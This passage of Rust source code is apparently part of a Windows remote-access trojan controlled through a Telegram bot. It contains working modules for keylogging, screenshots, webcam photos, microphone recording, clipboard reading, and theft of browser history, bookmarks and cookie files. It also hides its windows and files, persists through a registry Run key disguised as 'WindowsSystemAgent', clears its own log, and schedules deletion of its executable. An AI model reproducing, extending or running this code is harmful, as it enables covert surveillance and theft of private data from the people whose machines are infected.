        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;
    
    bot.send_message(msg.chat.id, "🔒 Workstation locked").await?;
    Ok(())
}

async fn cmd_logoff(bot: Bot, msg: Message) -> Result<()> {
    let args = ["/l"];
    log_command("shutdown", &args);
    Command::new("shutdown")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;
    
    bot.send_message(msg.chat.id, "👋 Logging off...").await?;
    Ok(())
}

async fn cmd_abort_shutdown(bot: Bot, msg: Message) -> Result<()> {
    let args = ["/a"];
    log_command("shutdown", &args);
    Command::new("shutdown")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;
    
    bot.send_message(msg.chat.id, "✅ Shutdown aborted").await?;
    Ok(())
}

async fn cmd_rickroll(bot: Bot, msg: Message) -> Result<()> {
    let _ = webbrowser::open("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    bot.send_message(msg.chat.id, "🎵 Never gonna give you up...").await?;
    Ok(())
}

async fn cmd_selfdestruct(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let seconds = args.get(0).and_then(|s| s.parse().ok()).unwrap_or(60);
    
    bot.send_message(msg.chat.id, format!("💣 Self-destruct in {} seconds", seconds)).await?;
    
    selfdestruct::schedule_selfdestruct(seconds);
    Ok(())
}

async fn cmd_stats(bot: Bot, msg: Message) -> Result<()> {
    let stats = COMMAND_STATS.lock().await;
    
    let mut info = "**📊 Command Statistics**\n\n".to_string();
    
    let mut commands: Vec<_> = stats.iter().collect();
    commands.sort_by(|a, b| b.1.cmp(a.1));
    
    for (cmd, count) in commands.iter().take(20) {
        info.push_str(&format!("{}: {}\n", cmd, count));
    }
    
    bot.send_message(msg.chat.id, info).await?;
    Ok(())
}

async fn cmd_logs(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let lines = args.get(0).and_then(|s| s.parse().ok()).unwrap_or(50);
    
    let log_file = dirs::data_local_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("Microsoft")
        .join("agent.log");
    
    if !log_file.exists() {
        bot.send_message(msg.chat.id, "📭 No logs found").await?;
        return Ok(());
    }
    
    let content = fs::read_to_string(log_file).await?;
    let lines_vec: Vec<&str> = content.lines().rev().take(lines).collect();
    let logs = lines_vec.iter().rev().cloned().collect::<Vec<_>>().join("\n");
    
    send_long_text(bot, msg.chat.id, &logs, "logs.txt").await?;
    Ok(())
}

async fn cmd_clear_logs(bot: Bot, msg: Message) -> Result<()> {
    let log_file = dirs::data_local_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("Microsoft")
        .join("agent.log");
    
    let _ = fs::remove_file(log_file).await;
    
    bot.send_message(msg.chat.id, "🧹 Logs cleared").await?;
    Ok(())
}

async fn cmd_version(bot: Bot, msg: Message) -> Result<()> {
    let version = env!("CARGO_PKG_VERSION");
    
    bot.send_message(msg.chat.id, format!(
        "**🤖 Agent Bot v{}**\n\nPlatform: Windows\nArchitecture: x64\nFeatures: Full Edition",
        version
    )).await?;
    Ok(())
}

// =============================================================================
// МОДУЛИ
// =============================================================================

mod system {
    use anyhow::{anyhow, Result};
    use super::*;
    use std::os::windows::process::CommandExt;
    use sysinfo::{System, Disks, Networks};
    use std::process::Command;
    
    pub struct SystemInfo;
    
    impl SystemInfo {
        pub fn get_system_info() -> String {
            let mut sys = System::new_all();
            sys.refresh_all();
            
            let hostname = hostname::get().unwrap_or_default();
            let username = whoami::username();
            let os = std::env::consts::OS.to_string();
            let kernel = "Unknown".to_string();
            
            format!(
                "**Hostname:** {}\n**User:** {}\n**OS:** {}\n**Kernel:** {}\n**CPU:** {} cores\n**Memory:** {:.1} GB",
                hostname.to_string_lossy(),
                username,
                os,
                kernel,
                num_cpus::get(),
                sys.total_memory() as f64 / 1024.0 / 1024.0 / 1024.0
            )
        }
    }
    
    pub async fn get_external_ip() -> Result<String> {
        let resp = reqwest::get("https://api.ipify.org").await?;
        let ip = resp.text().await?;
        Ok(ip)
    }
    
    pub fn get_internal_ip() -> String {
        for iface in super::get_network_interfaces() {
            for addr in &iface.addrs {
                if let std::net::IpAddr::V4(ipv4) = addr.addr {
                    if !ipv4.to_string().starts_with("127.") {
                        return ipv4.to_string();
                    }
                }
            }
        }
        "127.0.0.1".to_string()
    }
    
    pub async fn get_process_list() -> Result<String> {
        let mut sys = System::new_all();
        sys.refresh_all();
        
        let mut output = String::from("PID\tCPU%\tMEM(MB)\tNAME\n");
        for (pid, process) in sys.processes() {
            output.push_str(&format!("{}\t{:.1}\t{:.1}\t{}\n",
                pid.as_u32(),
                process.cpu_usage(),
                process.memory() as f64 / 1024.0 / 1024.0,
                process.name()
            ));
        }
        Ok(output)
    }
    
    pub async fn kill_process(target: &str) -> Result<String> {
        if let Ok(pid) = target.parse::<u32>() {
            unsafe {
                use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
                use winapi::um::handleapi::CloseHandle;
                use winapi::um::winnt::PROCESS_TERMINATE;
                
                let handle = OpenProcess(PROCESS_TERMINATE, 0, pid);
                if !handle.is_null() {
                    TerminateProcess(handle, 0);
                    CloseHandle(handle);
                    return Ok(format!("✅ Process {} terminated", pid));
                }
            }
        }
        Ok(format!("❌ Failed to kill {}", target))
    }
    
    pub fn get_disk_info() -> String {
        let disks = Disks::new_with_refreshed_list();
        
        let mut output = String::from("📀 **Disk Usage**\n\n");
        for disk in disks.list() {
            if disk.total_space() > 0 {
                let total_gb = disk.total_space() as f64 / 1024.0 / 1024.0 / 1024.0;
                let free_gb = disk.available_space() as f64 / 1024.0 / 1024.0 / 1024.0;
                let used_gb = total_gb - free_gb;
                let usage = (used_gb / total_gb) * 100.0;
                
                output.push_str(&format!("{}: {:.1}/{:.1} GB ({:.1}%)\n",
                    disk.name().to_string_lossy(),
                    used_gb, total_gb, usage
                ));
            }
        }
        output
    }
    
    pub fn get_ram_info() -> String {
        let mut sys = System::new_all();
        sys.refresh_memory();
        
        if sys.total_memory() == 0 {
            return "💾 **RAM Usage**\n\nUnable to get memory information".to_string();
        }
        
        let total_gb = sys.total_memory() as f64 / 1024.0 / 1024.0 / 1024.0;
        let used_gb = sys.used_memory() as f64 / 1024.0 / 1024.0 / 1024.0;
        let free_gb = sys.free_memory() as f64 / 1024.0 / 1024.0 / 1024.0;
        let usage = (used_gb / total_gb) * 100.0;
        
        format!("💾 **RAM Usage**\n\nTotal: {:.1} GB\nUsed: {:.1} GB\nFree: {:.1} GB\nUsage: {:.1}%",
            total_gb, used_gb, free_gb, usage)
    }
    
    pub async fn list_directory(path: &Path) -> Result<String> {
        let mut entries = Vec::new();
        let mut dir = fs::read_dir(path).await?;
        
        entries.push("📁 NAME                          SIZE      MODIFIED".to_string());
        entries.push("─".repeat(60).to_string());
        
        while let Some(entry) = dir.next_entry().await? {
            let metadata = entry.metadata().await?;
            let name = entry.file_name().to_string_lossy().to_string();
            let modified: DateTime<Utc> = metadata.modified()?.into();
            let size = if metadata.is_dir() {
                "<DIR>".to_string()
            } else {
                let size = metadata.len();
                if size < 1024 {
                    format!("{} B", size)
                } else if size < 1024 * 1024 {
                    format!("{:.1} KB", size as f64 / 1024.0)
                } else {
                    format!("{:.1} MB", size as f64 / 1024.0 / 1024.0)
                }
            };
            
            entries.push(format!("{} {:30} {:10} {}",
                if metadata.is_dir() { "📁" } else { "📄" },
                &name[..name.len().min(30)],
                size,
                modified.format("%Y-%m-%d %H:%M")
            ));
        }
        
        Ok(entries.join("\n"))
    }
    
    pub async fn ping_host(host: &str) -> Result<String> {
        let args = ["-n", "4", host];
        log_command("ping", &args);
        let output = Command::new("ping")
            .args(&args)
            .creation_flags(0x08000008)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .output()?;
        
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }
}

mod screenshot {
    use anyhow::Result;
    use std::path::PathBuf;
    use xcap::Monitor;
    use image::{ImageBuffer, DynamicImage, ImageFormat};
    
    pub async fn take_screenshot() -> Result<PathBuf> {
        let monitors = Monitor::all()?;
        let monitor = monitors.first().unwrap();
        
        let image = monitor.capture_image()?;
        
        let path = std::env::temp_dir().join(format!("screenshot_{}.jpg", chrono::Local::now().timestamp()));
        
        let rgb_image = DynamicImage::ImageRgba8(image).to_rgb8();
        DynamicImage::ImageRgb8(rgb_image).save_with_format(&path, ImageFormat::Jpeg)?;
        
        Ok(path)
    }
    
    pub async fn take_screenshot_with_region(region: Option<(i32, i32, u32, u32)>) -> Result<PathBuf> {
        let monitors = Monitor::all()?;
        let monitor = monitors.first().unwrap();
        
        let image = monitor.capture_image()?;
        
        let cropped = if let Some((x, y, w, h)) = region {
            let (img_w, img_h) = (image.width(), image.height());
            let x = x.max(0).min(img_w as i32 - 1);
            let y = y.max(0).min(img_h as i32 - 1);
            let w = w.min((img_w as i32 - x) as u32);
            let h = h.min((img_h as i32 - y) as u32);
            
            ImageBuffer::from_fn(w, h, |i, j| {
                *image.get_pixel((x + i as i32) as u32, (y + j as i32) as u32)
            })
        } else {
            image
        };
        
        let path = std::env::temp_dir().join(format!("screenshot_{}.jpg", chrono::Local::now().timestamp()));
        
        let rgb_image = DynamicImage::ImageRgba8(cropped).to_rgb8();
        DynamicImage::ImageRgb8(rgb_image).save_with_format(&path, ImageFormat::Jpeg)?;
        
        Ok(path)
    }
}

mod camera {
    use anyhow::{anyhow, Result};
    use std::path::PathBuf;
    use nokhwa::Camera;
    use nokhwa::utils::{CameraIndex, RequestedFormat, RequestedFormatType};
    use nokhwa::pixel_format::RgbFormat;
    
    pub async fn take_photo() -> Result<PathBuf> {
        let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::None);
        let mut camera = Camera::new(
            CameraIndex::Index(0),
            requested
        ).map_err(|_| anyhow!("No camera found"))?;
        
        camera.open_stream()?;
        let frame = camera.frame()?;
        
        let path = std::env::temp_dir().join(format!("photo_{}.jpg", chrono::Local::now().timestamp()));
        frame.decode_image::<RgbFormat>()?.save(&path)?;
        
        Ok(path)
    }
}

mod audio {
    use anyhow::{anyhow, Result};
    use std::path::PathBuf;
    use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
    use hound::{WavSpec, WavWriter};
    use std::sync::Arc;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::thread;
    
    pub async fn record_audio(seconds: u64) -> Result<PathBuf> {
        let path = std::env::temp_dir().join(format!("audio_{}.wav", chrono::Local::now().timestamp()));
        let path_clone = path.clone();
        
        let handle = tokio::task::spawn_blocking(move || -> Result<PathBuf> {
            let host = cpal::default_host();
            let device = host.default_input_device().ok_or_else(|| anyhow!("No input device"))?;
            let config = device.default_input_config()?;
            
            let spec = WavSpec {
                channels: config.channels(),
                sample_rate: config.sample_rate().0,
                bits_per_sample: 16,
                sample_format: hound::SampleFormat::Int,
            };
            
            let writer = Arc::new(std::sync::Mutex::new(WavWriter::create(&path_clone, spec)?));
            let writer_clone = writer.clone();
            let running = Arc::new(AtomicBool::new(true));
            let running_clone = running.clone();
            
            let stream = device.build_input_stream(
                &config.into(),
                move |data: &[f32], _: &cpal::InputCallbackInfo| {
                    if !running_clone.load(Ordering::SeqCst) {
                        return;
                    }
                    if let Ok(mut w) = writer_clone.lock() {
                        for &sample in data {
                            let sample_i16 = (sample * i16::MAX as f32) as i16;
                            let _ = w.write_sample(sample_i16);
                        }
                    }
                },
                move |err| eprintln!("Audio error: {}", err),
                None
            )?;
            
            stream.play()?;
            
            thread::sleep(std::time::Duration::from_secs(seconds));
            running.store(false, Ordering::SeqCst);
            
            drop(stream);
            if let Ok(w) = writer.lock() {
                drop(w);
            }
            
            Ok(path_clone)
        });
        
        handle.await?
    }
}

mod keylogger {
    use std::collections::VecDeque;
    use std::sync::{Arc, Mutex};
    use std::sync::atomic::{AtomicBool, Ordering};
    use anyhow::Result;
    use rdev::{listen, Event, EventType};
    use lazy_static::lazy_static;
    
    lazy_static! {
        static ref KEY_BUFFER: Arc<Mutex<VecDeque<String>>> = Arc::new(Mutex::new(VecDeque::with_capacity(1000)));
        static ref RUNNING: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
    }
    
    #[derive(Clone)]
    pub struct KeyLogger;
    
    impl KeyLogger {
        pub fn start() -> Result<Self> {
            if RUNNING.load(Ordering::SeqCst) {
                return Ok(KeyLogger);
            }
            
            RUNNING.store(true, Ordering::SeqCst);
            let running = RUNNING.clone();
            
            std::thread::spawn(move || {
                let callback = move |event: Event| {
                    if !running.load(Ordering::SeqCst) {
                        return;
                    }
                    
                    match event.event_type {
                        EventType::KeyPress(key) => {
                            let key_str = format!("{:?}", key);
                            let mut buffer = KEY_BUFFER.lock().unwrap();
                            buffer.push_back(key_str);
                            if buffer.len() > 1000 {
                                buffer.pop_front();
                            }
                        }
                        _ => {}
                    }
                };
                
                if let Err(error) = listen(callback) {
                    eprintln!("Keylogger error: {:?}", error);
                }
            });
            
            Ok(KeyLogger)
        }
        
        pub fn stop(&self) {
            RUNNING.store(false, Ordering::SeqCst);
        }
        
        pub fn get_log() -> String {
            let buffer = KEY_BUFFER.lock().unwrap();
            buffer.iter().cloned().collect::<Vec<_>>().join("\n")
        }
        
        pub fn clear_log() {
            let mut buffer = KEY_BUFFER.lock().unwrap();
            buffer.clear();
        }
        
        pub fn log_size() -> usize {
            let buffer = KEY_BUFFER.lock().unwrap();
            buffer.len()
        }
    }
}

mod autostart {
    use anyhow::Result;
    use std::env;
    use winreg::RegKey;
    use winreg::enums::HKEY_CURRENT_USER;
    
    pub fn setup_autostart() -> Result<()> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let run_key = hkcu.open_subkey_with_flags(
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            winreg::enums::KEY_SET_VALUE
        )?;
        
        let exe_path = env::current_exe()?;
        run_key.set_value("WindowsSystemAgent", &exe_path.to_string_lossy().to_string())?;
        
        Ok(())
    }
}

mod registry {
    use anyhow::{anyhow, Result};
    use winreg::RegKey;
    use winreg::enums::*;
    
    pub struct Registry;
    
    impl Registry {
        pub fn get(key: &str) -> Result<String> {
            let parts: Vec<&str> = key.split('\\').collect();
            if parts.is_empty() {
                return Err(anyhow!("Invalid registry key"));
            }
            
            let hive = match parts[0] {
                "HKEY_CURRENT_USER" | "HKCU" => HKEY_CURRENT_USER,
                "HKEY_LOCAL_MACHINE" | "HKLM" => HKEY_LOCAL_MACHINE,
                _ => return Err(anyhow!("Unknown hive")),
            };
            
            let path = parts[1..].join("\\");
            let key = RegKey::predef(hive).open_subkey(path)?;
            
            for name in key.enum_values() {
                if let Ok((name, value)) = name {
                    return Ok(format!("{}: {:?}", name, value));
                }
            }
            
            Ok("No values".to_string())
        }
        
        pub fn set(key: &str, val: &str) -> Result<()> {
            let parts: Vec<&str> = key.split('\\').collect();
            if parts.len() < 2 {
                return Err(anyhow!("Invalid registry key"));
            }
            
            let hive = match parts[0] {
                "HKEY_CURRENT_USER" | "HKCU" => HKEY_CURRENT_USER,
                "HKEY_LOCAL_MACHINE" | "HKLM" => HKEY_LOCAL_MACHINE,
                _ => return Err(anyhow!("Unknown hive")),
            };
            
            let value_name = parts.last().unwrap();
            let path = parts[1..parts.len()-1].join("\\");
            
            let key = RegKey::predef(hive).open_subkey_with_flags(path, KEY_SET_VALUE)?;
            key.set_value(value_name, &val)?;
            
            Ok(())
        }
        
        pub fn delete(key: &str) -> Result<()> {
            let parts: Vec<&str> = key.split('\\').collect();
            if parts.len() < 2 {
                return Err(anyhow!("Invalid registry key"));
            }
            
            let hive = match parts[0] {
                "HKEY_CURRENT_USER" | "HKCU" => HKEY_CURRENT_USER,
                "HKEY_LOCAL_MACHINE" | "HKLM" => HKEY_LOCAL_MACHINE,
                _ => return Err(anyhow!("Unknown hive")),
            };
            
            let value_name = parts.last().unwrap();
            let path = parts[1..parts.len()-1].join("\\");
            
            let key = RegKey::predef(hive).open_subkey_with_flags(path, KEY_SET_VALUE)?;
            key.delete_value(value_name)?;
            
            Ok(())
        }
    }
}

mod selfdestruct {
    use std::thread;
    use std::time::Duration;
    
    pub fn schedule_selfdestruct(seconds: u64) {
        thread::spawn(move || {
            thread::sleep(Duration::from_secs(seconds));
            
            // Вместо создания PowerShell скрипта, используем прямой WinAPI вызов
            unsafe {
                use winapi::um::fileapi::DeleteFileW;
                use std::os::windows::ffi::OsStrExt;
                
                let exe = std::env::current_exe().unwrap();
                let wide: Vec<u16> = exe.as_os_str().encode_wide().chain(Some(0)).collect();
                
                // Помечаем файл для удаления при перезагрузке
                winapi::um::winbase::MoveFileExW(
                    wide.as_ptr(),
                    std::ptr::null(),
                    winapi::um::winbase::MOVEFILE_DELAY_UNTIL_REBOOT
                );
            }
            
            std::process::exit(0);
        });
    }
}

mod file_utils {
    use std::path::Path;
    use anyhow::Result;
    use winapi::um::fileapi::SetFileAttributesW;
    use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
    
    pub fn hide_file(path: &Path) -> Result<()> {
        unsafe {
            use std::os::windows::ffi::OsStrExt;
            let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
            SetFileAttributesW(wide.as_ptr(), FILE_ATTRIBUTE_HIDDEN);
        }
        Ok(())
    }
    
    pub fn unhide_file(path: &Path) -> Result<()> {
        unsafe {
            use std::os::windows::ffi::OsStrExt;
            let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
            SetFileAttributesW(wide.as_ptr(), 0x80); // NORMAL
        }
        Ok(())
    }
}

mod window_monitor {
    use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW, GetWindowTextLengthW};
    
    pub fn active_window_title() -> String {
        unsafe {
            let hwnd = GetForegroundWindow();
            let length = GetWindowTextLengthW(hwnd);
            if length > 0 {
                let mut buffer = vec![0u16; (length + 1) as usize];
                GetWindowTextW(hwnd, buffer.as_mut_ptr(), length + 1);
                String::from_utf16_lossy(&buffer).trim_end_matches('\0').to_string()
            } else {
                String::new()
            }
        }
    }
}

mod cookie_stealer {
    use std::path::PathBuf;
    
    pub fn find_cookies() -> Vec<PathBuf> {
        let mut cookies = Vec::new();
        
        if let Some(app_data) = dirs::data_dir() {
            let chrome_cookies = app_data
                .join("Google")
                .join("Chrome")
                .join("User Data")
                .join("Default")
                .join("Cookies");
            
            if chrome_cookies.exists() {
                cookies.push(chrome_cookies);
            }
            
            let firefox_profiles = app_data.join("Mozilla").join("Firefox").join("Profiles");
            if firefox_profiles.exists() {
                if let Ok(entries) = std::fs::read_dir(firefox_profiles) {
                    for entry in entries.flatten() {
                        let cookies_file = entry.path().join("cookies.sqlite");
                        if cookies_file.exists() {
                            cookies.push(cookies_file);
                        }
                    }
                }
            }
        }
        
        cookies
    }
}

mod network_interface {
    use std::net::IpAddr;
    use ipconfig::get_adapters;
    
    #[derive(Clone)]
    pub struct NetworkInterface {
        pub name: String,
        pub mac_addr: Option<String>,
        pub addrs: Vec<Addr>,
    }
    
    #[derive(Clone)]
    pub struct Addr {
        pub addr: IpAddr,
    }
    
    impl NetworkInterface {
        pub fn show() -> Result<Vec<Self>, std::io::Error> {
            let mut interfaces = Vec::new();
            
            if let Ok(adapters) = get_adapters() {
                for adapter in adapters {
                    if adapter.ip_addresses().is_empty() {
                        continue;
                    }
                    
                    let addrs = adapter.ip_addresses()
                        .iter()
                        .map(|ip| Addr { addr: *ip })
                        .collect();
                    
                    let mac = adapter.physical_address()
                        .map(|b| b.iter().map(|x| format!("{:02X}", x)).collect::<Vec<_>>().join(":"));
                    
                    interfaces.push(NetworkInterface {
                        name: if adapter.friendly_name().is_empty() { "Unknown".to_string() } else { adapter.friendly_name().to_string() },
                        mac_addr: mac,
                        addrs,
                    });
                }
            }
            
            Ok(interfaces)
        }
        
        pub fn is_up(&self) -> bool {
            true
        }
    }
}

mod clipboard {
    use clipboard_win::{Clipboard, Getter, Setter, formats as clip_formats};
    use anyhow::{anyhow, Result};
    
    pub fn get_clipboard() -> String {
        let mut buffer = String::new();
        if let Ok(_) = Clipboard::new_attempts(10)
            .and_then(|_| clip_formats::Unicode.read_clipboard(&mut buffer)) {
            buffer
        } else {
            String::new()
        }
    }
    
    pub fn set_clipboard(text: &str) -> Result<()> {
        let _clip = Clipboard::new_attempts(10)
            .map_err(|e| anyhow!("Failed to open clipboard: {}", e))?;
        clip_formats::Unicode.write_clipboard(&text.to_string())
            .map_err(|e| anyhow!("Failed to write to clipboard: {}", e))?;
        Ok(())
    }
}

mod browser_stealer {
    use anyhow::{anyhow, Result};
    use rusqlite::Connection;
    use std::path::PathBuf;
    use std::fs;
    use dirs;

    pub fn get_chrome_history() -> Result<Vec<String>> {
        let db_path = dirs::data_local_dir()
            .ok_or_else(|| anyhow!("Cannot find local data dir"))?
            .join("Google")
            .join("Chrome")
            .join("User Data")
            .join("Default")
            .join("History");
        
        if !db_path.exists() {
            return Err(anyhow!("Chrome history not found"));
        }

        let temp_path = std::env::temp_dir().join("chrome_history_temp");
        fs::copy(&db_path, &temp_path)?;

        let conn = Connection::open(&temp_path)?;
        let mut stmt = conn.prepare(
            "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
        )?;
        
        let rows = stmt.query_map([], |row| {
            Ok(format!(
                "🔗 {}\n   Title: {}\n   Visits: {} | Last: {}\n",
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, i64>(2)?,
                row.get::<_, i64>(3)?
            ))
        })?;

        let mut results = Vec::new();
        for row in rows {
            results.push(row?);
        }

        let _ = fs::remove_file(temp_path);
        Ok(results)
    }

    pub fn get_chrome_bookmarks() -> Result<Vec<String>> {
        let bookmarks_path = dirs::data_local_dir()
            .ok_or_else(|| anyhow!("Cannot find local data dir"))?
            .join("Google")
            .join("Chrome")
            .join("User Data")
            .join("Default")
            .join("Bookmarks");

        if !bookmarks_path.exists() {
            return Err(anyhow!("Chrome bookmarks not found"));
        }

        let content = fs::read_to_string(bookmarks_path)?;
        let json: serde_json::Value = serde_json::from_str(&content)?;
        let mut results = Vec::new();

        if let Some(roots) = json.get("roots").and_then(|r| r.as_object()) {
            for (_, folder) in roots {
                extract_bookmarks(folder, &mut results, 0);
            }
        }

        Ok(results)
    }

    fn extract_bookmarks(node: &serde_json::Value, out: &mut Vec<String>, depth: usize) {
        if let Some(children) = node.get("children").and_then(|c| c.as_array()) {
            for child in children {
                if child.get("type").and_then(|t| t.as_str()) == Some("url") {
                    if let (Some(name), Some(url)) = (
                        child.get("name").and_then(|n| n.as_str()),
                        child.get("url").and_then(|u| u.as_str())
                    ) {
                        out.push(format!("{}{} -> {}", "  ".repeat(depth), name, url));
                    }
                } else {
                    extract_bookmarks(child, out, depth + 1);
                }
            }
        }
    }

    pub fn get_firefox_history() -> Result<Vec<String>> {
        let profiles_path = dirs::data_dir()
            .ok_or_else(|| anyhow!("Cannot find data dir"))?
            .join("Mozilla")
            .join("Firefox")
            .join("Profiles");

        if !profiles_path.exists() {
            return Err(anyhow!("Firefox profiles not found"));
        }

        let mut results = Vec::new();
        for entry in fs::read_dir(profiles_path)? {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                let db_path = path.join("places.sqlite");
                if db_path.exists() {
                    let temp_path = std::env::temp_dir().join("firefox_history_temp");
                    fs::copy(&db_path, &temp_path)?;
                    let conn = Connection::open(&temp_path)?;
                    let mut stmt = conn.prepare(
                        "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100"
                    )?;
                    let rows = stmt.query_map([], |row| {
                        Ok(format!(
                            "🦊 {}\n   Title: {}\n   Visits: {}\n",
                            row.get::<_, String>(0)?,
                            row.get::<_, String>(1)?,
                            row.get::<_, i64>(2)?
                        ))
                    })?;
                    for row in rows {
                        results.push(row?);
                    }
                    let _ = fs::remove_file(temp_path);
                }
            }
        }
        Ok(results)
    }
}

fn get_network_interfaces() -> Vec<network_interface::NetworkInterface> {
    network_interface::NetworkInterface::show().unwrap_or_default()
}

#[allow(dead_code)]
fn unused_functions() {
    let _ = BufReader::new(std::io::empty());
    let _ = BufWriter::new(std::io::sink());
    let _ = TcpStream::connect("127.0.0.1:0");
    let _ = UdpSocket::bind("127.0.0.1:0");
    let _ = TcpListener::bind("127.0.0.1:0");
    let _ = CString::new("").unwrap();
    let _ = lookup_host("localhost");
    let _ = BASE64_STANDARD.encode(b"");
    let _ = BASE64_STANDARD.decode("").unwrap();
    let _ = hex::encode("");
}